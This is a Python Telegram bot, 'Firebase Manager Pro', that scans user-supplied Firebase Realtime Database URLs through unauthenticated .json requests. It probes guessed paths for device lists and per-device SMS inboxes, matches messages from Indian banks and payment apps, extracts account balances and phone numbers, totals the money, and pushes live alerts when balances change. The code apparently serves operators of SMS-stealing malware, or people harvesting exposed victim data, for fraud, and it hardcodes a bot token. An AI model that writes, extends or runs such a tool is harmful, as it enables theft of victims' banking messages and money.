#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FIREBASE MANAGER PRO - SIMPLIFIED + LIVE UPDATES
Commands: /add /delete /show /live
"""

import os, re, sys, time, logging, asyncio, traceback
from datetime import datetime
from typing import Optional, List, Dict, Any

import aiohttp, requests
from aiohttp import ClientTimeout, TCPConnector, ClientSession, ClientError

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.error import TelegramError, RetryAfter, TimedOut, NetworkError
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters, ContextTypes)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8908910798:AAFy6DWXPeCaLAnGkcGz0jCc9hMbeZP7deY")
BOT_NAME = "FIREBASE MANAGER PRO"

BATCH_SIZE = 25
MAX_CONCURRENT_REQUESTS = 100
MAX_PER_HOST = 10
HTTP_TIMEOUT = 6
MAX_RETRIES = 2
RETRY_DELAY = 0.5
PAGE_DELAY = 0.8
MAX_DEVICES_PER_FB = 100
MAX_MSG_LENGTH = 3800

LIVE_SCAN_INTERVAL = 45

logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("FBManager")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram.ext").setLevel(logging.WARNING)

# ============================================================
# USER DATA
# ============================================================
USER_FIREBASES: Dict[int, List[str]] = {}
USER_LIVE: Dict[int, bool] = {}
USER_SEEN: Dict[int, Dict[str, str]] = {}
USER_STATS: Dict[int, Dict[str, int]] = {}

def get_user_firebases(uid): return USER_FIREBASES.get(uid, [])
def add_user_firebase(uid, url):
    if uid not in USER_FIREBASES: USER_FIREBASES[uid] = []
    if url in USER_FIREBASES[uid]: return False
    USER_FIREBASES[uid].append(url); return True
def add_user_firebases(uid, urls):
    if uid not in USER_FIREBASES: USER_FIREBASES[uid] = []
    added = 0
    for url in urls:
        if url not in USER_FIREBASES[uid]:
            USER_FIREBASES[uid].append(url); added += 1
    return added
def clear_user_firebases(uid): USER_FIREBASES[uid] = []
def remove_user_firebase(uid, url):
    if uid in USER_FIREBASES and url in USER_FIREBASES[uid]:
        USER_FIREBASES[uid].remove(url); return True
    return False
def is_live_on(uid): return USER_LIVE.get(uid, False)
def set_live(uid, state): USER_LIVE[uid] = state

# ============================================================
# FIREBASE URL DETECT
# ============================================================
def extract_firebase_urls(text: str) -> List[str]:
    if not text: return []
    urls = set()
    patterns = [
        r'https?://[a-zA-Z0-9\-_.]+\.firebaseio\.com',
        r'https?://[a-zA-Z0-9\-_.]+\.firebasedatabase\.app',
        r'[a-zA-Z0-9\-_.]+\.firebaseio\.com',
        r'[a-zA-Z0-9\-_.]+\.firebasedatabase\.app',
    ]
    for pattern in patterns:
        for match in re.finditer(pattern, text, re.IGNORECASE):
            url = match.group(0).strip().rstrip('/').rstrip(',').rstrip(';').rstrip('.')
            url = url.strip('"').strip("'").strip('`').strip('<').strip('>')
            if not url.startswith('http'):
                url = 'https://' + url
            if validate_url(url): urls.add(url)
    return list(urls)

def auto_detect_and_clean(text: str) -> List[str]:
    urls = set()
    urls.update(extract_firebase_urls(text))
    try:
        import json as _json
        data = _json.loads(text)
        if isinstance(data, dict):
            for k in ['firebase_url', 'firebaseUrl', 'databaseURL', 'url']:
                if k in data and isinstance(data[k], str):
                    u = data[k].strip()
                    if 'firebase' in u.lower():
                        if not u.startswith('http'): u = 'https://' + u
                        if validate_url(u): urls.add(u)
    except: pass
    return list(urls)

def validate_url(url):
    if not url or not isinstance(url, str): return False
    url = url.strip()
    if not url.startswith("http"): return False
    lower = url.lower()
    if "firebaseio.com" not in lower and "firebasedatabase.app" not in lower: return False
    try:
        from urllib.parse import urlparse
        p = urlparse(url)
        return bool(p.scheme and p.netloc)
    except: return False

def clean_url(line):
    urls = extract_firebase_urls(line)
    return urls[0] if urls else None

# ============================================================
# FIELD MAP
# ============================================================
DEVICE_FIELD_MAP = {
    "name": ["modelName", "model", "deviceName", "device_name", "name", "deviceModel", "brand", "handset"],
    "status": ["status", "is_online", "isOnline", "online", "active", "connected", "state"],
    "phone": ["mobNo", "phone", "phoneNumber", "phone_number", "mobile", "mobileNumber", "number", "msisdn", "simNumber"],
    "lastSeen": ["lastSeen", "last_seen", "lastOnline", "last_online", "lastActive", "timestamp", "updatedAt"],
    "sims": ["sims", "sim_info", "simInfo", "sim", "simCards", "sim_details"],
}

MESSAGE_FIELD_MAP = {
    "text": ["message", "body", "text", "content", "msg", "sms_body", "smsBody", "sms", "message_body", "full_message"],
    "sender": ["sender", "from", "address", "number", "phone", "originator", "sender_address", "fromNumber"],
    "time": ["dateTime", "datetime", "date", "time", "timestamp", "sentAt", "receivedAt", "createdAt"],
    "type": ["type", "msgType", "msg_type", "messageType", "direction"],
}

CLIENTS_PATHS = ["clients", "devices", "device_list", "deviceList", "online_devices", "onlineDevices",
                 "data/clients", "data/devices", "app/clients", "users", "active_devices"]

MESSAGES_PATHS = [
    "messages/{device_id}", "messages/{device_id}/inbox", "messages/{device_id}/sent",
    "data/messages/{device_id}", "data/{device_id}/messages", "sms/{device_id}",
    "inbox/{device_id}", "device_messages/{device_id}", "clients/{device_id}/messages",
    "clients/{device_id}/sms", "clients/{device_id}/inbox", "devices/{device_id}/messages",
    "devices/{device_id}/sms", "device/{device_id}/messages", "{device_id}/messages", "{device_id}/sms",
]

# ============================================================
# BANK PATTERNS
# ============================================================
BANK_PATTERNS = [
    (re.compile(r"HDFCBK|HDFCBANK|HDFC", re.I), "HDFC Bank"),
    (re.compile(r"SBIIN|SBIINB|SBIN|SBI", re.I), "SBI"),
    (re.compile(r"ICICIB|ICICI", re.I), "ICICI Bank"),
    (re.compile(r"AXISBK|AXISBANK|AXIS", re.I), "Axis Bank"),
    (re.compile(r"KOTAKB|KOTAK", re.I), "Kotak Bank"),
    (re.compile(r"PNBSMS|PNB", re.I), "PNB"),
    (re.compile(r"BOIIND|BOI", re.I), "Bank of India"),
    (re.compile(r"CANBNK|CANARA", re.I), "Canara Bank"),
    (re.compile(r"UNIONB|UBISMS", re.I), "Union Bank"),
    (re.compile(r"YESBNK|YESBANK", re.I), "Yes Bank"),
    (re.compile(r"IDBIBK|IDBI", re.I), "IDBI Bank"),
    (re.compile(r"INDUSB|INDUSIND", re.I), "IndusInd Bank"),
    (re.compile(r"FEDERAL|FEDBNK", re.I), "Federal Bank"),
    (re.compile(r"RBLBNK|RBL", re.I), "RBL Bank"),
    (re.compile(r"PAYTM", re.I), "Paytm"),
    (re.compile(r"PHONEPE|PHNPE", re.I), "PhonePe"),
    (re.compile(r"GPAY|GOOGLEPAY", re.I), "Google Pay"),
    (re.compile(r"AMAZONPAY", re.I), "Amazon Pay"),
    (re.compile(r"BAJAJFIN", re.I), "Bajaj Finance"),
    (re.compile(r"CRED", re.I), "CRED"),
    (re.compile(r"AIRTEL", re.I), "Airtel Payments"),
    (re.compile(r"JIOMNY|JIOMONEY", re.I), "Jio Money"),
]

BALANCE_PATTERNS = [
    re.compile(r"(?:Avl|Avail|Aval|Avbl|Available)\.?\s*(?:Bal|Balance)\.?[\s:]+(?:INR|Rs\.?|₹)?\s*([\d,]+\.?\d*)", re.I),
    re.compile(r"Bal(?:ance)?\.?[\s:]+(?:INR|Rs\.?|₹)\s*([\d,]+\.?\d*)", re.I),
    re.compile(r"(?:INR|Rs\.?|₹)\s*([\d,]+\.?\d*)\s+(?:Avl|Bal|Available)", re.I),
    re.compile(r"(?:balance|bal)\s*(?:is)?[\s:]+(?:INR|Rs\.?|₹)\s*([\d,]+\.?\d*)", re.I),
    re.compile(r"(?:INR|Rs\.?|₹)\s*([\d,]+\.\d{2})\b", re.I),
    re.compile(r"Rs\.?\s*([\d,]+\.?\d*)", re.I),
]

def escape_html(text):
    if text is None: return ""
    try: return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    except: return ""

def safe_str(value, default="—"):
    if value is None: return default
    try:
        s = str(value).strip()
        return s if s else default
    except: return default

def get_field(data, field_type, default=None):
    if not isinstance(data, dict): return default
    for key in DEVICE_FIELD_MAP.get(field_type, []):
        try:
            if key in data and data[key] is not None: return data[key]
        except: continue
    return default

def get_msg_field(data, field_type, default=None):
    if not isinstance(data, dict): return default
    for key in MESSAGE_FIELD_MAP.get(field_type, []):
        try:
            if key in data and data[key] is not None: return data[key]
        except: continue
    return default

def is_online(info):
    try:
        status = get_field(info, "status")
        if status is None:
            ls = get_field(info, "lastSeen")
            if ls:
                try:
                    if isinstance(ls, (int, float)):
                        ts = ls if ls > 1e12 else ls * 1000
                        if time.time() * 1000 - ts < 5 * 60 * 1000: return True
                    elif isinstance(ls, str):
                        for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ"]:
                            try:
                                t = datetime.strptime(ls.replace("Z", ""), fmt.replace("Z", ""))
                                if (datetime.now() - t).total_seconds() < 5 * 60: return True
                                break
                            except: continue
                except: pass
            return False
        if isinstance(status, bool): return status
        if isinstance(status, (int, float)): return status == 1
        if isinstance(status, str):
            return status.lower() in ["true", "online", "active", "connected", "1", "yes", "on"]
        return False
    except: return False

def get_sim_phone(sim):
    if not isinstance(sim, dict): return "—"
    for key in ["phoneNumber", "phone_number", "number", "phone", "mobNo", "mobile", "msisdn"]:
        try:
            if key in sim and sim[key]: return str(sim[key])
        except: continue
    return "—"

def detect_bank_name(sender, text):
    try:
        combined = f"{sender} {text}".upper()
        for pattern, name in BANK_PATTERNS:
            if pattern.search(combined): return name
    except: pass
    return "Unknown"

def extract_balance(text):
    if not text: return "—"
    best = None
    for pattern in BALANCE_PATTERNS:
        try:
            m = pattern.search(text)
            if m:
                val = m.group(1).replace(",", "")
                try:
                    num = float(val)
                    if num <= 0 or num > 100000000: continue
                    formatted = f"₹{num:,.2f}"
                    if best is None: best = formatted
                    elif any(k in text.lower() for k in ["balance", "avl", "bal"]):
                        best = formatted; break
                except: continue
        except: continue
    return best or "—"

def analyze_messages(messages):
    result = {"bank_name": "—", "balance": "—", "last_sms": "—"}
    if not messages or not isinstance(messages, dict): return result
    try:
        items = list(messages.items()); items.reverse()
        for _, msg_data in items[:80]:
            if not isinstance(msg_data, dict): continue
            merged = dict(msg_data)
            for nk in ["info", "data", "message_info"]:
                if nk in msg_data and isinstance(msg_data[nk], dict):
                    merged = {**merged, **msg_data[nk]}
            msg_data = merged
            text = safe_str(get_msg_field(msg_data, "text", ""), "")
            sender = safe_str(get_msg_field(msg_data, "sender", ""), "")
            if not text: continue
            msg_type = safe_str(get_msg_field(msg_data, "type", ""), "").lower()
            if msg_type in ["outgoing", "sent", "outbox"]: continue
            bank = detect_bank_name(sender, text)
            if bank == "Unknown": continue
            balance = extract_balance(text)
            if balance != "—":
                return {"bank_name": bank, "balance": balance, "last_sms": text[:200]}
            elif result["bank_name"] == "—":
                result["bank_name"] = bank
                result["last_sms"] = text[:200]
    except: pass
    return result

# ============================================================
# HTTP
# ============================================================
async def fetch_json(session, url, timeout=HTTP_TIMEOUT, retries=MAX_RETRIES):
    for attempt in range(retries + 1):
        try:
            async with session.get(url, timeout=ClientTimeout(total=timeout)) as resp:
                if resp.status == 200:
                    try: return await resp.json(content_type=None)
                    except: return None
                elif resp.status in (401, 403, 404): return None
                elif resp.status == 429:
                    await asyncio.sleep(RETRY_DELAY * (attempt + 1)); continue
                else: return None
        except (asyncio.TimeoutError, ClientError):
            if attempt < retries: await asyncio.sleep(RETRY_DELAY); continue
        except Exception:
            if attempt < retries: await asyncio.sleep(RETRY_DELAY); continue
    return None

async def fetch_firebase_devices(session, firebase_url):
    base = firebase_url.rstrip("/")
    for path in CLIENTS_PATHS:
        try:
            data = await fetch_json(session, f"{base}/{path}.json")
            if not data or not isinstance(data, dict): continue
            devices = []
            for dev_id, info in data.items():
                try:
                    if not isinstance(info, dict): continue
                    merged = dict(info)
                    for nk in ["info", "device", "data", "details", "deviceInfo"]:
                        if nk in info and isinstance(info[nk], dict):
                            merged = {**merged, **info[nk]}
                    info = merged
                    if not any(k in info for k in ["modelName","model","deviceName","name","status","sims","battery","mobNo","phone","is_online"]): continue
                    if not is_online(info): continue
                    name = safe_str(get_field(info, "name", "Unknown"))
                    sims = get_field(info, "sims", [])
                    if isinstance(sims, dict): sims = list(sims.values())
                    if not isinstance(sims, list): sims = []
                    phone = safe_str(get_field(info, "phone", "—"))
                    if phone == "—" and sims: phone = get_sim_phone(sims[0])
                    devices.append({"id": safe_str(dev_id), "name": name, "phone": phone})
                    if len(devices) >= MAX_DEVICES_PER_FB: break
                except: continue
            if devices: return devices, path, None
        except: continue
    return [], None, "No online devices"

async def fetch_device_messages(session, firebase_url, device_id):
    base = firebase_url.rstrip("/")
    for template in MESSAGES_PATHS:
        try:
            path = template.format(device_id=device_id)
            data = await fetch_json(session, f"{base}/{path}.json")
            if data and isinstance(data, dict): return analyze_messages(data)
        except: continue
    return {"bank_name": "—", "balance": "—", "last_sms": "—"}

async def analyze_firebases(urls, progress_callback=None):
    results = []
    total = len(urls)
    processed = 0
    if not urls: return results
    connector = TCPConnector(limit=MAX_CONCURRENT_REQUESTS, limit_per_host=MAX_PER_HOST, ttl_dns_cache=300)
    try:
        async with ClientSession(connector=connector, timeout=ClientTimeout(total=HTTP_TIMEOUT),
                                  headers={"Accept": "application/json", "User-Agent": "FBManager/1.0"}) as session:
            for bs in range(0, total, BATCH_SIZE):
                batch = urls[bs:bs + BATCH_SIZE]
                tasks = [fetch_firebase_devices(session, u) for u in batch]
                try: dr = await asyncio.gather(*tasks, return_exceptions=True)
                except: dr = [Exception("fail")] * len(batch)
                for i, url in enumerate(batch):
                    fb = {"firebase_url": url, "devices": []}
                    try:
                        d = dr[i]
                        if isinstance(d, Exception):
                            results.append(fb); processed += 1; continue
                        devs, _, err = d
                        if err:
                            results.append(fb); processed += 1; continue
                        mt = [fetch_device_messages(session, url, x["id"]) for x in devs]
                        try: mr = await asyncio.gather(*mt, return_exceptions=True)
                        except: mr = [{"bank_name":"—","balance":"—","last_sms":"—"}] * len(devs)
                        for dev, m in zip(devs, mr):
                            try:
                                if isinstance(m, Exception): m = {"bank_name":"—","balance":"—","last_sms":"—"}
                                dev["bank_name"] = m.get("bank_name", "—")
                                dev["balance"] = m.get("balance", "—")
                                fb["devices"].append(dev)
                            except: continue
                        results.append(fb); processed += 1
                    except:
                        results.append(fb); processed += 1
                if progress_callback:
                    try: await progress_callback(processed, total)
                    except: pass
                if bs + BATCH_SIZE < total: await asyncio.sleep(0.2)
    except Exception as e: logger.error(f"Analyze error: {e}")
    return results

# ============================================================
# FORMAT
# ============================================================
def format_show_results(results):
    if not results: return "❌ No results"
    paid = []
    for fb in results:
        url = fb.get("firebase_url", "")
        for d in fb.get("devices", []):
            balance = d.get("balance", "—")
            bank = d.get("bank_name", "—")
            if balance != "—" and bank not in ["—", "Unknown"]:
                paid.append({"url": url, "id": d.get("id", ""),
                             "phone": d.get("phone", "—"), "bank": bank, "balance": balance})
    if not paid:
        return (f"❌ <b>No devices with balance found</b>\n\n"
                f"🌐 Scanned: <b>{len(results)}</b> firebase(s)")
    total_amt = 0.0
    for d in paid:
        try:
            amt = float(d["balance"].replace("₹", "").replace(",", "").strip())
            total_amt += amt
        except: pass
    header = (f"💰 <b>DEVICES WITH BALANCE</b>\n"
              f"━━━━━━━━━━━━━━━━━━━\n"
              f"📱 Devices: <b>{len(paid)}</b>\n"
              f"💵 Total: <b>₹{total_amt:,.2f}</b>\n"
              f"━━━━━━━━━━━━━━━━━━━\n")
    text = header
    for i, d in enumerate(paid, 1):
        block = (f"\n<b>#{i}</b> 🏦 <b>{escape_html(d['bank'])}</b>\n"
                 f"💰 <b>{escape_html(d['balance'])}</b>\n"
                 f"🆔 <code>{escape_html(d['id'])}</code>\n"
                 f"🌐 <code>{escape_html(d['url'])}</code>\n")
        if d["phone"] and d["phone"] != "—":
            block += f"📞 <code>{escape_html(d['phone'])}</code>\n"
        if len(text) + len(block) > MAX_MSG_LENGTH:
            text += "\n\n<i>⚠️ More results truncated</i>"
            break
        text += block
    return text

async def safe_send(chat_id, text, bot, retries=3):
    for _ in range(retries):
        try:
            await bot.send_message(chat_id=chat_id, text=text, parse_mode='HTML', disable_web_page_preview=True)
            return True
        except RetryAfter as e: await asyncio.sleep(e.retry_after + 1)
        except (TimedOut, NetworkError): await asyncio.sleep(2)
        except TelegramError: return False
        except: return False
    return False

# ============================================================
# KEYBOARDS
# ============================================================
def main_menu_kb(uid=0):
    cnt = len(get_user_firebases(uid))
    live = "🟢 ON" if is_live_on(uid) else "🔴 OFF"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Firebase", callback_data="add_btn"),
         InlineKeyboardButton("🗑 Delete Firebase", callback_data="del_btn")],
        [InlineKeyboardButton("💰 Show Results", callback_data="show_btn")],
        [InlineKeyboardButton(f"📡 Live: {live}", callback_data="live_btn")],
        [InlineKeyboardButton(f"📊 Total: {cnt} firebase(s)", callback_data="noop")],
    ])

def back_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Menu", callback_data="menu")]])
def cancel_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="menu")]])

def menu_text(uid):
    cnt = len(get_user_firebases(uid))
    live = "🟢 ON" if is_live_on(uid) else "🔴 OFF"
    return (
        f"⚡ <b>{BOT_NAME}</b>\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"📊 Firebases: <b>{cnt}</b>\n"
        f"📡 Live Updates: <b>{live}</b>\n\n"
        f"<b>Commands:</b>\n"
        f"/add — Add Firebase\n"
        f"/delete — Delete Firebase\n"
        f"/show — Show Results\n"
        f"/live — Toggle Live Updates\n"
    )

# ============================================================
# COMMANDS
# ============================================================
async def start(update, context):
    uid = update.effective_user.id
    text = menu_text(uid); kb = main_menu_kb(uid)
    if update.callback_query:
        try: await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode='HTML')
        except: await update.callback_query.message.reply_text(text, reply_markup=kb, parse_mode='HTML')
    else:
        await update.message.reply_text(text, reply_markup=kb, parse_mode='HTML')

async def menu_cb(u, c): await u.callback_query.answer(); await start(u, c)
async def noop_cb(u, c): await u.callback_query.answer()

async def add_cmd(u, c):
    c.user_data["state"] = "add"
    await u.message.reply_text(
        "📥 <b>Send Firebase URL(s)</b>\n\n"
        "Ek ya multiple URLs bhejo (line by line)\n"
        "Auto-detect bhi karega — koi bhi text paste karo\n\n"
        "<i>Example:</i>\n"
        "<code>https://app1.firebaseio.com</code>\n"
        "<code>https://app2.firebasedatabase.app</code>",
        reply_markup=cancel_kb(), parse_mode='HTML'
    )

async def add_btn_cb(u, c):
    await u.callback_query.answer()
    c.user_data["state"] = "add"
    await u.callback_query.edit_message_text(
        "📥 <b>Send Firebase URL(s)</b>\n\nEk ya multiple URLs bhejo.",
        reply_markup=cancel_kb(), parse_mode='HTML'
    )

async def delete_cmd(u, c):
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        await u.message.reply_text("❌ No firebases saved.", reply_markup=main_menu_kb(uid), parse_mode='HTML')
        return
    text = f"🗑 <b>Your Firebases ({len(urls)})</b>\n\n"
    for i, x in enumerate(urls, 1):
        text += f"{i}. <code>{escape_html(x)}</code>\n"
    text += "\n<b>Reply with number to delete, or 'all' to delete all.</b>"
    if len(text) > MAX_MSG_LENGTH:
        text = text[:MAX_MSG_LENGTH] + "\n\n<i>...truncated</i>"
    c.user_data["state"] = "delete"
    await u.message.reply_text(text, reply_markup=cancel_kb(), parse_mode='HTML', disable_web_page_preview=True)

async def del_btn_cb(u, c):
    await u.callback_query.answer()
    await delete_cmd(u, c)

async def show_cmd(u, c):
    uid = u.effective_user.id
    urls = get_user_firebases(uid)
    if not urls:
        msg = "❌ No firebases saved.\n\n➕ Add first using /add"
        if u.message:
            await u.message.reply_text(msg, reply_markup=main_menu_kb(uid), parse_mode='HTML')
        return
    msg = await u.message.reply_text(
        f"💰 <b>Scanning {len(urls)} firebase(s)...</b>\n\n"
        f"<code>[░░░░░░░░░░] 0/{len(urls)}</code>",
        parse_mode='HTML'
    )
    total = len(urls)
    lu = {"t": 0, "c": 0}
    async def pcb(p, t):
        now = time.time()
        if p - lu["c"] >= max(3, t // 15) or now - lu["t"] >= 2 or p == t:
            lu["c"] = p; lu["t"] = now
            bar = "█" * int(10 * p / t) + "░" * (10 - int(10 * p / t)) if t else "░░░░░░░░░░"
            try:
                await msg.edit_text(f"💰 <b>Scanning...</b>\n\n<code>[{bar}] {p}/{t}</code>", parse_mode='HTML')
            except: pass
    results = await analyze_firebases(urls, progress_callback=pcb)
    text = format_show_results(results)
    await safe_send(u.effective_chat.id, text, c.bot)
    _update_seen_from_results(uid, results)
    try: await msg.delete()
    except: pass
    try:
        await c.bot.send_message(chat_id=u.effective_chat.id, text=menu_text(uid),
                                  reply_markup=main_menu_kb(uid), parse_mode='HTML')
    except: pass

async def show_btn_cb(u, c):
    await u.callback_query.answer()
    await show_cmd(u, c)

async def live_cmd(u, c):
    uid = u.effective_user.id
    cur = is_live_on(uid)
    set_live(uid, not cur)
    state = "🟢 ON" if not cur else "🔴 OFF"
    await u.message.reply_text(
        f"📡 <b>Live Updates: {state}</b>\n\n"
        + ("Naye bank message aate hi turant alert milega!"
           if not cur else "Live updates band kar diye."),
        reply_markup=main_menu_kb(uid), parse_mode='HTML'
    )

async def live_btn_cb(u, c):
    uid = u.effective_user.id
    cur = is_live_on(uid)
    set_live(uid, not cur)
    state = "🟢 ON" if not cur else "🔴 OFF"
    await u.callback_query.answer(f"Live: {state}", show_alert=True)
    await start(u, c)

# ============================================================
# MESSAGE HANDLER
# ============================================================
async def handle_msg(update, context):
    state = context.user_data.get("state")
    text = update.message.text.strip() if update.message.text else ""
    uid = update.effective_user.id

    if state == "add":
        urls = auto_detect_and_clean(text)
        if not urls:
            await update.message.reply_text(
                "❌ <b>No Firebase URL found</b>\n\nTry again or /cancel",
                reply_markup=cancel_kb(), parse_mode='HTML'
            )
            return
        added = add_user_firebases(uid, urls)
        cnt = len(get_user_firebases(uid))
        if added > 0:
            await update.message.reply_text(
                f"✅ <b>+{added} Firebase(s) added</b>\n📊 Total: <b>{cnt}</b>",
                reply_markup=main_menu_kb(uid), parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                f"⚠️ Already exists\n📊 Total: <b>{cnt}</b>",
                reply_markup=main_menu_kb(uid), parse_mode='HTML'
            )
        context.user_data["state"] = None
        return

    if state == "delete":
        urls = get_user_firebases(uid)
        if text.lower() == "all":
            n = len(urls)
            clear_user_firebases(uid)
            USER_SEEN[uid] = {}
            await update.message.reply_text(
                f"✅ <b>Deleted all {n} firebase(s)</b>",
                reply_markup=main_menu_kb(uid), parse_mode='HTML'
            )
            context.user_data["state"] = None
            return
        try:
            idx = int(text) - 1
            if 0 <= idx < len(urls):
                removed = urls[idx]
                remove_user_firebase(uid, removed)
                if uid in USER_SEEN:
                    USER_SEEN[uid] = {k: v for k, v in USER_SEEN[uid].items() if not k.startswith(removed + "|")}
                await update.message.reply_text(
                    f"✅ <b>Deleted:</b>\n<code>{escape_html(removed)}</code>\n\n"
                    f"📊 Remaining: <b>{len(get_user_firebases(uid))}</b>",
                    reply_markup=main_menu_kb(uid), parse_mode='HTML'
                )
            else:
                await update.message.reply_text("❌ Invalid number", reply_markup=cancel_kb(), parse_mode='HTML')
                return
        except:
            await update.message.reply_text("❌ Send a number or 'all'", reply_markup=cancel_kb(), parse_mode='HTML')
            return
        context.user_data["state"] = None
        return

    urls = auto_detect_and_clean(text)
    if urls:
        added = add_user_firebases(uid, urls)
        cnt = len(get_user_firebases(uid))
        if added > 0:
            await update.message.reply_text(
                f"✅ <b>+{added} added</b>\n📊 Total: <b>{cnt}</b>",
                reply_markup=main_menu_kb(uid), parse_mode='HTML'
            )
        return

    await update.message.reply_text(menu_text(uid), reply_markup=main_menu_kb(uid), parse_mode='HTML')

async def cancel_cmd(u, c):
    c.user_data["state"] = None
    await u.message.reply_text("❌ Cancelled", reply_markup=main_menu_kb(u.effective_user.id), parse_mode='HTML')

# ============================================================
# LIVE SCANNER
# ============================================================
def _update_seen_from_results(uid: int, results: List[Dict[str, Any]]):
    if uid not in USER_SEEN: USER_SEEN[uid] = {}
    for fb in results:
        url = fb.get("firebase_url", "")
        for d in fb.get("devices", []):
            bal = d.get("balance", "—")
            bank = d.get("bank_name", "—")
            if bal != "—" and bank not in ["—", "Unknown"]:
                key = f"{url}|{d.get('id','')}"
                USER_SEEN[uid][key] = f"{bank}|{bal}"

async def live_scanner(app):
    logger.info("📡 Live scanner started")
    while True:
        try:
            await asyncio.sleep(LIVE_SCAN_INTERVAL)
            for uid in list(USER_FIREBASES.keys()):
                if not is_live_on(uid): continue
                urls = get_user_firebases(uid)
                if not urls: continue
                try:
                    results = await analyze_firebases(urls)
                except Exception as e:
                    logger.warning(f"Live scan fail uid={uid}: {e}")
                    continue

                if uid not in USER_SEEN: USER_SEEN[uid] = {}
                if uid not in USER_STATS: USER_STATS[uid] = {"alerts": 0}
                seen = USER_SEEN[uid]
                new_alerts = []

                for fb in results:
                    url = fb.get("firebase_url", "")
                    for d in fb.get("devices", []):
                        bank = d.get("bank_name", "—")
                        bal = d.get("balance", "—")
                        if bank in ["—", "Unknown"] or bal == "—": continue
                        key = f"{url}|{d.get('id','')}"
                        cur_val = f"{bank}|{bal}"
                        prev = seen.get(key)
                        if prev != cur_val:
                            new_alerts.append({
                                "url": url, "id": d.get("id", ""),
                                "phone": d.get("phone", "—"),
                                "bank": bank, "balance": bal,
                                "is_new": prev is None,
                            })
                        seen[key] = cur_val

                USER_SEEN[uid] = seen

                if not new_alerts:
                    continue

                for a in new_alerts[:8]:
                    tag = "🆕 <b>NEW DEVICE</b>" if a["is_new"] else "🔄 <b>BALANCE UPDATED</b>"
                    txt = (
                        f"📡 <b>LIVE UPDATE</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━\n"
                        f"{tag}\n\n"
                        f"🏦 <b>{escape_html(a['bank'])}</b>\n"
                        f"💰 <b>{escape_html(a['balance'])}</b>\n"
                        f"🆔 <code>{escape_html(a['id'])}</code>\n"
                        f"🌐 <code>{escape_html(a['url'])}</code>\n"
                    )
                    if a["phone"] and a["phone"] != "—":
                        txt += f"📞 <code>{escape_html(a['phone'])}</code>\n"
                    txt += f"\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                    try:
                        await app.bot.send_message(
                            chat_id=uid, text=txt,
                            parse_mode='HTML', disable_web_page_preview=True
                        )
                        USER_STATS[uid]["alerts"] = USER_STATS[uid].get("alerts", 0) + 1
                        await asyncio.sleep(0.8)
                    except RetryAfter as e:
                        await asyncio.sleep(e.retry_after + 1)
                    except TelegramError as e:
                        logger.warning(f"Live alert send fail uid={uid}: {e}")
                    except: pass
        except Exception as e:
            logger.error(f"Live scanner error: {e}")
            await asyncio.sleep(10)

# ============================================================
# POST INIT
# ============================================================
async def post_init(app):
    try:
        await app.bot.set_my_commands([
            BotCommand("start", "🏠 Menu"),
            BotCommand("add", "➕ Add Firebase"),
            BotCommand("delete", "🗑 Delete Firebase"),
            BotCommand("show", "💰 Show Results"),
            BotCommand("live", "📡 Live Updates ON/OFF"),
            BotCommand("cancel", "❌ Cancel"),
        ])
        logger.info("✅ Commands set")
    except Exception as e:
        logger.warning(f"Cmd: {e}")
    asyncio.create_task(live_scanner(app))
    logger.info("📡 Live scanner task started")

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")

# ============================================================
# MAIN
# ============================================================
def main():
    logger.info("=" * 50)
    logger.info(f"🤖 {BOT_NAME}")
    logger.info("=" * 50)
    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10)
        d = r.json()
        if not d.get("ok"):
            logger.error(f"❌ {d}"); sys.exit(1)
        logger.info(f"✅ Bot: @{d['result'].get('username')}")
    except Exception as e:
        logger.error(f"❌ {e}"); sys.exit(1)
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=5)
        logger.info("✅ Webhook deleted")
    except: pass

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", start))
    app.add_handler(CommandHandler("add", add_cmd))
    app.add_handler(CommandHandler("delete", delete_cmd))
    app.add_handler(CommandHandler("show", show_cmd))
    app.add_handler(CommandHandler("live", live_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))

    app.add_handler(CallbackQueryHandler(menu_cb, pattern="^menu$"))
    app.add_handler(CallbackQueryHandler(noop_cb, pattern="^noop$"))
    app.add_handler(CallbackQueryHandler(add_btn_cb, pattern="^add_btn$"))
    app.add_handler(CallbackQueryHandler(del_btn_cb, pattern="^del_btn$"))
    app.add_handler(CallbackQueryHandler(show_btn_cb, pattern="^show_btn$"))
    app.add_handler(CallbackQueryHandler(live_btn_cb, pattern="^live_btn$"))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_error_handler(error_handler)

    logger.info("🤖 Polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True, poll_interval=1.0, timeout=30)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: logger.info("Stopped")
    except Exception as e:
        logger.error(f"Fatal: {e}\n{traceback.format_exc()}"); sys.exit(1)